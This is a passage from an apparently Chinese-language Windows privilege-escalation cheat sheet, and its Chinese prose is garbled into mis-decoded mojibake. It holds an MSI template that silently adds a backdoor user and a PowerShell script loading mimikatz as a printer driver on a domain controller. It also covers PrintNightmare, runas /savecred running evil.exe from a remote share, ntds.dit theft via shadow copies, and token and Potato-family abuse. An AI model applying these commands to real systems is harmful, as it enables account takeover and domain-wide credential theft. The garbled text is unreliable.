&lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id="DefaultFeature" Level="1"&gt; &lt;ComponentRef Id="ApplicationFiles" /&gt; &lt;/Feature&gt; &lt;CustomAction Id="Shell" Execute="deferred" Directory="TARGETDIR" Impersonate="no" ExeCommand="net user zhi 123.com /add" Return="check" /&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action="Shell" After="InstallFiles"&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; å°†è¯¥æ¨¡æ¿æ‰“åŒ…æˆ .msi æ–‡ä»¶ï¼š candle zhi.wxs light zhi.wixobj æ­¤æ—¶å·²ç»ç”Ÿæˆäº†zhi.msiæ–‡ä»¶ï¼Œè¿è¡Œè¯¥æ–‡ä»¶å³å¯åˆ›å»ºç”¨æˆ·åä¸ºzhi AlwaysInstallElevatedææƒ æœ¬åœ°ä¾¦æ“¦ä¸ææƒ - JFSec - åšå®¢å›­ åˆ©ç”¨å­˜åœ¨æ¼æ´çš„é©±åŠ¨ææƒ æ¡ä»¶ï¼š æ¼æ´ å­˜åœ¨æ¼æ´çš„é©±åŠ¨ æŸ¥çœ‹é©±åŠ¨ï¼š PS C:\Users\Swissky&gt; driverquery.exe /fo table /si Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM &lt;SNIP&gt; å¯¹æ¯”å­˜åœ¨æ¼æ´çš„é©±åŠ¨ï¼š LOLDrivers åˆ©ç”¨æ‰“å°æœºææƒ å°† mimikatz æ·»åŠ ä¸ºè™šæ‹Ÿæ‰“å°æœº Create a Printer $printerName = 'Universal Priv Printer' $system32 = $env:systemroot + '\system32' $drivers = $system32 + '\spool\drivers' $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName Copy-Item -Force -Path ($system32 + '\mscms.dll') -Destination ($system32 + '\mimispool.dll') Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll' -Destination ($drivers + '\x64\3\mimispool.dll') Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers + '\W32X86\3\mimispool.dll') Add-PrinterDriver -Name 'Generic / Text Only' Add-Printer -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared New-Item -Path ($RegStartPrinter + '\CopyFiles') | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Kiwi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Directory' -PropertyType 'String' -Value 'x64\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String' -Value 'W32X86\3' | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files' -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module' -PropertyType 'String' -Value 'mscms.dll' | Out-Null New-Item -Path ($RegStartPrinter + '\CopyFiles\Mango') | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Directory' -PropertyType 'String' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Files' -PropertyType 'MultiString' -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Module' -PropertyType 'String' -Value 'mimispool.dll' | Out-Null Execute the driver $serverName = 'dc.purple.lab' $printerName = 'Universal Priv Printer' $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'}) Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue Add-Printer -ConnectionName $fullprinterName PrinterNightmare æ¼æ´CVEç¼–å·ï¼šCVE-2021-1675ã€‚æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ä»¥SYSTEMæƒé™åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œè·å¾—æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒã€‚å»ºè®®å—å½±å“ç”¨æˆ·åŠæ—¶æ›´æ–°æ¼æ´è¡¥ä¸è¿›è¡Œé˜²æŠ¤ï¼Œåšå¥½èµ„äº§è‡ªæŸ¥ä»¥åŠé¢„é˜²å·¥ä½œï¼Œä»¥å…é­å—é»‘å®¢æ”»å‡»ã€‚ å½±å“èŒƒå›´ Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows RT 8.1 Windows 8.1 for x64-based systems Windows 8.1 for 32-bit systems Windows 7 for x64-based Systems Service Pack 1 Windows 7 for 32-bit Systems Service Pack 1 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 for 32-bit Systems Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows 10 Version 21H1 for 32-bit Systems Windows 10 Version 21H1 for ARM64-based Systems Windows 10 Version 21H1 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527 [ã€–EXPã€—Ladonæ‰“å°æœºæ¼æ´ææƒCVE-2021-1675å¤ç° K8å“¥å“¥â€™s Blog](https://k8gege.org/p/CVE-2021-1675.html) Bring Your Own Vulnerability windows å…è®¸ä½æƒé™ç”¨æˆ·å®‰è£…æ‰“å°æœºé©±åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªè¡Œå®‰è£…å¸¦æœ‰æ¼æ´çš„é©±åŠ¨ç¨‹åºï¼Œç„¶åé€šè¿‡è¿™äº›é©±åŠ¨ç¨‹åºçš„æ¼æ´ææƒåˆ° SYSTEMã€‚ Concealed Position : https://github.com/jacob-baines/concealed_position ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE åˆ©ç”¨ expï¼š jacob-baines/concealed_position: Bring your own print driver privilege escalation tool åˆ©ç”¨ RunAS å‘½ä»¤ææƒæˆ–é™æƒ RunAS å‘½ä»¤ä½¿ç”¨åœºæ™¯ï¼š æƒé™ä¸å¤Ÿè¯»ä¸åˆ°å¸å¯†æˆ– HASH çš„æƒ…å†µä¸‹ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦ä½¿ç”¨æŸä¸ªå·²ä¿å­˜çš„å¯†ç ï¼Œä½¿ç”¨è¯¥å·²ä¿å­˜çš„å¯†ç å¯å®ç°ææƒ SYSTEM æƒé™é™æƒåˆ°æŸä¸ªç”¨æˆ·è¿›è¡Œæ“ä½œæ—¶ï¼Œä¾‹å¦‚åˆ‡æ¢åˆ°ç‰¹å®šçš„ç”¨æˆ·ï¼Œè¯»å–å¯¹åº”çš„æµè§ˆå™¨è®°å½•ã€æˆ–è€…è·å–ç‰¹å®šç”¨æˆ·çš„ shell ç­‰ã€‚ æšä¸¾ä¿å­˜çš„å¯†ç ï¼š cmdkey /list Currently stored credentials: Target: Domain:interactive=WORKGROUP\Administrator Type: Domain Password User: WORKGROUP\Administrator ä½¿ç”¨ä¿å­˜çš„å‡­è¯è¿æ¥è¿œç¨‹ SMB æˆ–è€…ç›´æ¥è¿è¡Œå‘½ä»¤ï¼š runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" runas /savecred /user:Administrator "cmd.exe /k whoami" å…¶ä»–åˆ©ç”¨ï¼š ã€–æ•™ç¨‹ã€—Ladonéäº¤äº’å¼runasæ‰§è¡Œå‘½ä»¤/åå¼¹SHELL ç³»ç»Ÿè‡ªå¸¦Runaså‘½ä»¤éœ€è¦äº¤äº’å¼ç™»é™†ï¼Œåœ¨webshellæˆ–ä¸æ”¯æŒäº¤äº’å¼çš„shellä¸‹ä½¿ç”¨éº»çƒ¦ã€‚è€ŒLadonçš„Runasåˆ™å®Œç¾è§£å†³äº†ä»¥ä¸Šé—®é¢˜ï¼Œæ”¯æŒéäº¤äº’å¼æ¨¡æ‹Ÿç™»é™†æŒ‡å®šç”¨æˆ·è¿è¡Œç¨‹åºæˆ–å‘½ä»¤ã€‚ åˆ©ç”¨ Shadow Copies ææƒï¼ˆåŸŸæ§ï¼‰ è¯¥åˆ©ç”¨æ–¹å¼ä¸€èˆ¬ç”¨äºä»åŸŸæ§ä¸­è·å– ntds.dit æ–‡ä»¶ï¼ˆæ´»åŠ¨ç›®å½•ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åœ¨è¯¥æ–‡ä»¶ä¸­ï¼‰ã€‚ è·å–å·å½±ä½ç½®ï¼š # List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows # List shadow copies using diskshadow diskshadow list shadows all åˆ›å»ºè½¯é“¾æ¥ä»¥ä¾¿æŸ¥çœ‹ã€‚ # Make a symlink to the shadow copy and access mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ æˆ–è€…åˆ›å»ºä¸€ä¸ªå·å½±æ‹·è´ï¼Œç„¶åå¤åˆ¶å‡ºæ¥ vssadmin create shadow /for=c: copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit è·å–åˆ° ntds åï¼Œå¯ä»¥æƒ³åŠæ³•è·å–å…¶ä¸­çš„æ•£åˆ—å€¼ã€‚ Impacket ä¸­çš„ Secretsdump msf ä¸­çš„ Psexec_ntdsgrab æ¨¡å— msf ä¸­ Meterpreterä¼šè¯ + windows/gather/credentials/domain_hashdump å‚è€ƒèµ„æ–™ï¼š åŸŸæ§å®‰å…¨ä¹‹åŸŸæ¸—é€ - çŸ¥ä¹ åˆ©ç”¨ PsExec ææƒ(Win2003 &amp; Win2008) PsExec æ˜¯ windows å†…æ ¸å¥—ä»¶ SysInternalSuite ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ä» Administrator ææƒåˆ° SYSTEM ä¸‹è½½åœ°å€:Sysinternals Utilities - Sysinternals | Microsoft Learn PsExec -i -s cmd å‚è€ƒ SecBooks/ã€å…¬ä¼—å·æ–‡ç« ã€‘bypass/å®æˆ˜é‡è§åˆ°çš„å¥½ç”¨ææƒæ–¹æ³•é›†åˆ.md at main Â· SexyBeast233/SecBooks åˆ©ç”¨ Windows è‡ªå¸¦æ–‡ä»¶ã€è„šæœ¬ææƒ Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/ æ»¥ç”¨ Token ææƒ æ¡ä»¶ï¼š å·²ç»æ‹¿åˆ°éç®¡ç†å‘˜æƒé™çš„æœåŠ¡å¸æˆ· æ•ˆæœï¼š ææƒè‡³ SYSTEM èƒŒæ™¯çŸ¥è¯† å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è¯¥è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ã€‚ä»¤ç‰Œæ ‡è¯†äº†ç”¨æˆ·ã€ç”¨æˆ·çš„ç»„ã€ç”¨æˆ·çš„æƒé™ä»¥åŠSIDï¼ˆå®‰å…¨æ ‡è¯†ç¬¦ï¼‰ã€‚ å½“æœ¬åœ°ç®¡ç†å‘˜ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸¤ä¸ªè®¿é—®ä»¤ç‰Œï¼šä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¦ä¸€ä¸ªå…·æœ‰æ™®é€šæƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“è¯¥ç”¨æˆ·æ‰§è¡Œè¿›ç¨‹æ—¶ï¼Œå°†ä½¿ç”¨å…·æœ‰å¸¸è§„ï¼ˆéç®¡ç†å‘˜ï¼‰æƒé™çš„è¿›ç¨‹ã€‚å½“æ­¤ç”¨æˆ·å°è¯•ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ï¼‰æ—¶ï¼Œå°†ä½¿ç”¨ UAC æ¥è¯·æ±‚æƒé™ã€‚ ä½¿ç”¨ whoami /priv å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ã€‚æ‹¥æœ‰ä¸‹é¢æƒé™æ—¶å¯è€ƒè™‘ä½¿ç”¨è¿™ç§æ–¹å¼ï¼š iis sqlserver çš„ç”¨æˆ·é€šå¸¸å…·æœ‰ SeImpersonatePrivilege å’Œ SeAssignPrimaryPrivilege æƒé™ã€‚ æœåŠ¡ç”¨æˆ·é€šå¸¸æ‹¥æœ‰ SeBackupPrivilege å’Œ SeRestorePrivilege æƒé™ã€‚ SeIncreaseQuotaPrivilege: DISABLED SeShutdownPrivilege: DISABLED SeAuditPrivilege: DISABLED SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeUndockPrivilege: DISABLED SeIncreaseWorkingSetPrivilege: DISABLED SeTimeZonePrivilege: DISABLED ä¸åŒçš„å‡ ç§æƒé™å¯èƒ½ä¼šç”¨äºä¸åŒçš„æ”»å‡»åœºæ™¯ 1. SeImpersonatePrivilege ä»»ä½•æ‹¥æœ‰æ­¤æƒé™çš„è¿›ç¨‹éƒ½å¯ä»¥æ¨¡æ‹Ÿï¼ˆä½†ä¸èƒ½åˆ›å»ºï¼‰å®ƒèƒ½å¤Ÿå¤„ç†çš„ä»»ä½•ä»¤ç‰Œã€‚ æ‚¨å¯ä»¥ä» Windows æœåŠ¡ (DCOM) è·å–ç‰¹æƒä»¤ç‰Œï¼Œä½¿å…¶é’ˆå¯¹è¯¥æ¼æ´æ‰§è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œç„¶åä»¥ SYSTEM èº«ä»½æ‰§è¡Œè¿›ç¨‹ã€‚ åˆ©ç”¨æ–¹æ³•ï¼š ä½¿ç”¨ NTLM relay åˆ°æœ¬åœ°åå•†è·å¾—ç³»ç»Ÿç”¨æˆ·çš„ tokenã€‚ å¯ä»¥ä½¿ç”¨å¼€æºå·¥å…·çƒ‚åœŸè±†ã€å­¤ç‹¬åœŸè±†æˆ–å¤šæ±åœŸè±†ã€‚ é€šè¿‡WinAPI CreateProcessWithTokenåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œä¼ å…¥ç³»ç»Ÿç”¨æˆ·çš„ä»¤ç‰Œã€‚ åªæœ‰å…·æœ‰SeImpersonatePrivilegeæƒé™æ‰èƒ½æˆåŠŸåˆ›å»ºã€‚ 2. SeAssignPrimaryPrivilege å®ƒä¸ SeImpersonatePrivilege éå¸¸ç›¸ä¼¼ï¼Œå®ƒå°†ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æ¥è·å–ç‰¹æƒä»¤ç‰Œã€‚ ç„¶åï¼Œæ­¤æƒé™å…è®¸å°†ä¸»ä»¤ç‰Œåˆ†é…ç»™æ–°çš„/æŒ‚èµ·çš„è¿›ç¨‹ã€‚ ä½¿ç”¨ç‰¹æƒæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæ‚¨å¯ä»¥æ´¾ç”Ÿä¸»ä»¤ç‰Œ (DuplicateTokenEx)ã€‚æœ‰äº†ä»¤ç‰Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨â€œCreateProcessAsUserâ€åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„è¿›ç¨‹å¹¶è®¾ç½®ä»¤ç‰Œï¼ˆé€šå¸¸ï¼Œæ‚¨ä¸èƒ½ä¿®æ”¹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ä¸»ä»¤ç‰Œï¼‰ã€‚ åˆ©ç”¨æ–¹æ³•ï¼š åˆ©ç”¨ NTLM Relay åˆ°å½“åœ°è°ˆåˆ¤è·å¾—ç³»ç»Ÿç”¨æˆ·çš„ token é€šè¿‡ WinAPI CreateProcessAsUser åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä¼ å…¥ç³»ç»Ÿç”¨æˆ·çš„ tokenï¼Œè¯¥ token å…·æœ‰ç³»ç»Ÿæƒé™ã€‚ 3. SeBackupPrivilege æ­¤æƒé™ä½¿ç³»ç»Ÿæˆäºˆå¯¹ä»»ä½•æ–‡ä»¶çš„æ‰€æœ‰è¯»å–è®¿é—®æ§åˆ¶ï¼ˆä»…é™è¯»å–ï¼‰ã€‚ä½¿ç”¨å®ƒä»æ³¨å†Œè¡¨ä¸­è¯»å–æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œç„¶åå°†â€œpsexecâ€æˆ–â€œwmicexecâ€ä¸å“ˆå¸Œå€¼ (PTH) ç»“åˆä½¿ç”¨ã€‚ å¦‚æœæœ¬åœ°ç®¡ç†å‘˜è¢«ç¦ç”¨ï¼Œæˆ–è€…é…ç½®ä¸ºæœ¬åœ°ç®¡ç†å‘˜åœ¨è¿œç¨‹è¿æ¥æ—¶ä¸æ˜¯ç®¡ç†å‘˜ï¼Œåˆ™æ­¤æ”»å‡»å°†ä¸èµ·ä½œç”¨ã€‚ æ”»å‡»åœºæ™¯ï¼šæ”¶é›† 4. SeRestorePrivilege å¯¹ç³»ç»Ÿä¸Šä»»ä½•æ–‡ä»¶çš„å†™å…¥è®¿é—®æ§åˆ¶ï¼Œæ— è®ºæ–‡ä»¶ ACL ä¸ºä½•ã€‚ä½ å¯ä»¥ä¿®æ”¹æœåŠ¡ã€DLLåŠ«æŒã€è®¾ç½®è°ƒè¯•å™¨ï¼ˆå›¾åƒæ–‡ä»¶æ‰§è¡Œé€‰é¡¹ï¼‰â€¦â€¦å¾ˆå¤šé€‰é¡¹å¯ä»¥å‡çº§ æ”»å‡»åœºæ™¯ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿ 5. SeCreateTokenPrivilege ä»…å½“ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆå³ä½¿æ²¡æœ‰ SeImpersonatePrivilegeï¼‰æ—¶ï¼Œæ­¤ä»¤ç‰Œæ‰å¯ä»¥ç”¨ä½œ EoP æ–¹æ³•ã€‚ åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä»¤ç‰Œé’ˆå¯¹åŒä¸€ç”¨æˆ·å¹¶ä¸”å®Œæ•´æ€§çº§åˆ«å°äºæˆ–ç­‰äºå½“å‰è¿›ç¨‹å®Œæ•´æ€§çº§åˆ«ï¼Œåˆ™ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä»¤ç‰Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿä»¤ç‰Œå¹¶å‘å…¶æ·»åŠ ç‰¹æƒç»„ SIDã€‚ æ”»å‡»æ–¹å¼ï¼šææƒ 6. SeLoadDriverPrivilege åŠ è½½å’Œå¸è½½è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚ æ”»å‡»æ–¹å¼ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿ 7. SeTakeOwnershipPrivilege æ­¤æƒé™ä¸ SeRestorePrivilege éå¸¸ç›¸ä¼¼ã€‚å®ƒå…è®¸è¿›ç¨‹é€šè¿‡æˆäºˆ WRITE_OWNER è®¿é—®æƒé™æ¥â€œè·å¾—å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œè€Œæ— éœ€æˆäºˆä»»æ„è®¿é—®æƒé™â€ã€‚é¦–å…ˆï¼Œæ‚¨å¿…é¡»è·å¾—è¦å†™å…¥çš„æ³¨å†Œè¡¨é¡¹çš„æ‰€æœ‰æƒå¹¶ä¿®æ”¹ DACLï¼Œä»¥ä¾¿å¯ä»¥åœ¨å…¶ä¸Šå†™å…¥ã€‚ æ”»å‡»åœºæ™¯ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿ï¼›æ”¶é›† 8. SeDebugPrivilege å®ƒå…è®¸æŒæœ‰è€…è°ƒè¯•å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™åŒ…æ‹¬è¯»å–å’Œå†™å…¥è¯¥è¿›ç¨‹çš„å†…å­˜ã€‚æœ‰è®¸å¤šä¸åŒçš„å†…å­˜æ³¨å…¥ç­–ç•¥å¯ä»¥ä¸æ­¤ç‰¹æƒä¸€èµ·ä½¿ç”¨ï¼Œä»è€Œè§„é¿å¤§å¤šæ•° AV/HIPS è§£å†³æ–¹æ¡ˆã€‚ æ”»å‡»æ–¹å¼ï¼šå‡­æ®çªƒå–ã€ææƒã€é˜²å¾¡è§„é¿ç­‰ã€‚ 9. SeTcbPrivilege æ­¤æƒé™å°†å…¶æŒæœ‰è€…æ ‡è¯†ä¸ºå—ä¿¡ä»»è®¡ç®—æœºåº“çš„ä¸€éƒ¨åˆ†ã€‚æŸäº›å—ä¿¡ä»»çš„å—ä¿æŠ¤å­ç³»ç»Ÿè¢«æˆäºˆæ­¤ç‰¹æƒã€‚ æ”»å‡»åœºæ™¯ï¼šæƒé™æå‡ å‚è€ƒï¼š Windows TokenåŸç†åŠåˆ©ç”¨ - ç½‘å®‰ æ¸—é€æŠ€å·§â€”â€”åˆ©ç”¨Windowsçš„ä¹å¤§æƒé™ - WEB and server security vulnerabilities - é»‘å®¢ä¸­æ–‡è®ºå›ç½‘ç«™ åŸºäº Token ææƒçš„åˆ©ç”¨å·¥å…·å°±æ˜¯å¸¸ç”¨çš„ Potato å®¶æ—äº†ï¼š Origin Potato(MS08-068) Origin Potato å°±æ˜¯ NTLM-Relayï¼Œå¾®è½¯åœ¨ kb957097 è¡¥ä¸ä¸­é€šè¿‡ä¿®å¤ SMB èº«ä»½éªŒè¯ç­”å¤çš„éªŒè¯æ–¹å¼æ¥é˜²æ­¢å‡­æ®é‡æ’­ã€‚ å½“ä¸»æœº A å‘ä¸»æœº B è¿›è¡Œ SMB è®¤è¯çš„æ—¶å€™ï¼Œå°† pszTargetName è®¾ç½®ä¸º cifs/Bï¼Œç„¶ååœ¨ type2 æ‹¿åˆ° B å‘é€çš„ Challenge ä¹‹åï¼Œåœ¨ lsass é‡Œé¢ç¼“å­˜ (Challenge,cifs/B)ï¼Œæ¥ç€ B æ‹¿åˆ° A çš„ type3ï¼Œè¿™æ—¶ä¼šå»æ£€æŸ¥ lsass ç¼“å­˜é‡Œæ˜¯å¦æœ‰ (Challenge,cifs/B)ï¼Œå¦‚æœæœ‰å°±è¯´æ˜è¿™æ˜¯åŒä¸€å°ä¸»æœºï¼Œé‚£ä¹ˆè®¤è¯å¤±è´¥ã€‚ Hot Potato Hot Potato æ˜¯ Potato å®¶æ—æœ€æ—©çš„åˆ©ç”¨æ–¹å¼ï¼Œå…¶æ”»å‡»åŸç†å¦‚ä¸‹ï¼š Windows Update æœåŠ¡ä»¥ SYSTEM æƒé™è¿è¡Œï¼Œä¸”ä¼šå‘èµ· NTLM è®¤è¯ï¼Œå¦‚æœèƒ½å¤Ÿä½œä¸ºä¸­é—´äººï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿé€šè¿‡ NTLM Relay è·å–åˆ° SYSTEM æƒé™ã€‚ Windows Update æœåŠ¡åœ¨è¿è¡Œæ—¶ä¼šé»˜è®¤è¯·æ±‚ http://wpad/wpad.dat è¿™ä¸ª URL ä»¥è·å–ç½‘ç»œä»£ç†çš„é…ç½®ï¼Œä½†è¿™ä¸ªåŸŸåå¹¶ä¸æ˜¯æ‰€æœ‰ä¸»æœºéƒ½ä¼šé…ç½®ï¼Œå…¬ç½‘ä¸Šä¹Ÿæ²¡æœ‰è¿™ä¸ªåŸŸåï¼Œæ ¹æ® Windows çš„åŸŸåè§£æé¡ºåºï¼ˆhost-&gt; DNS æŸ¥è¯¢ -&gt; NBNS æŸ¥è¯¢ï¼‰ï¼Œåªè¦æ”»å‡»è€…ä¼ªé€ ä¸€ä¸ª NBNS æŸ¥è¯¢çš„å“åº”ï¼Œå°±èƒ½å¤Ÿæ§åˆ¶ Windows Update æœåŠ¡çš„ä»£ç†æŒ‡å‘è‡ªå·±ã€‚ æ”»å‡»è€…ä»¥ä¸­é—´äººçš„èº«ä»½å®Œæˆ NTLM Relay ä»è€Œè·å–åˆ° System æƒé™çš„ tokenã€‚ å½±å“èŒƒå›´ï¼š Windows 7,8,10,Server 2008 ä»¥åŠ Server 2012 å…¶æ­¥éª¤å¦‚ä¸‹ï¼š Windows Update æœåŠ¡é»˜è®¤æƒ…å†µä¸‹ä¼šè¯·æ±‚ http://wpad/wpad.dat æ¥è·å–ç½‘ç»œä»£ç†é…ç½®ã€‚ä½†ä¸æ˜¯æ‰€æœ‰çš„ä¸»æœºéƒ½å­˜åœ¨ä¿å­˜ç€è¯¥åŸŸåè§£æçš„ç»“æœï¼Œå½“æœ¬åœ° HOST åŠ DNS æŸ¥è¯¢éƒ½æ— æ³•è·å–è¯¥åŸŸåçš„è§£æç»“æœæ—¶ï¼Œå°±ä¼šè§¦å‘ NBNS æŸ¥è¯¢ã€‚ æ”»å‡»è€…åœ¨æœ¬åœ°å‘èµ· NBNSï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰æ¬ºéª—ã€‚ä½¿å¾— Windows åœ¨æœ¬åœ°å¹¿æ’­æŸ¥è¯¢ç›®æ ‡ HOST æ—¶ï¼Œæ”»å‡»è€…ä¼ªé€ å“åº”ï¼Œå£°ç§° wpad æœåŠ¡å™¨ IP åœ°å€ä¸º 127.0.0.1ï¼Œå¹¶ä¸”è¿”å›ç½‘ç»œä»£ç†é…ç½®ä¸º 127.0.0.1:80 Windows Update æœåŠ¡è·å–åˆ°ç½‘ç»œä»£ç†åï¼Œæ‰€æœ‰çš„ http æµé‡å°±éƒ½ä¼šç»è¿‡æ”»å‡»è€…æ­å»ºçš„ 127.0.0.1:80ã€‚ æ­¤æ—¶ Windows Update æœåŠ¡è¿›è¡Œ NTLM è®¤è¯ä¸­çš„ Hash å°±ä¼šè¢«æ”»å‡»è€…æ•è·ï¼Œä»è€Œå‘èµ· NTLM Relay æ”»å‡»ã€‚ å±€é™ï¼š è¿™ç§æ”»å‡»æ‰‹æ³•éœ€è¦ç­‰å¾… windows update æœåŠ¡å‘èµ·æ›´æ–°è¯·æ±‚ã€‚ Rotten Potato æ”»å‡»åŸç†ï¼š COM ï¼ˆç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰API å¯ä»¥åœ¨æŒ‡å®šçš„ç½‘ç»œä½ç½®åŠ è½½ä¸€ä¸ªæœåŠ¡å¯¹è±¡ã€‚ä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ï¼ŒCOM API å‡½æ•° CoGetInstanceFromIStorage ä¼šæ ¹æ®æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£å· 127.0.0.1:6666 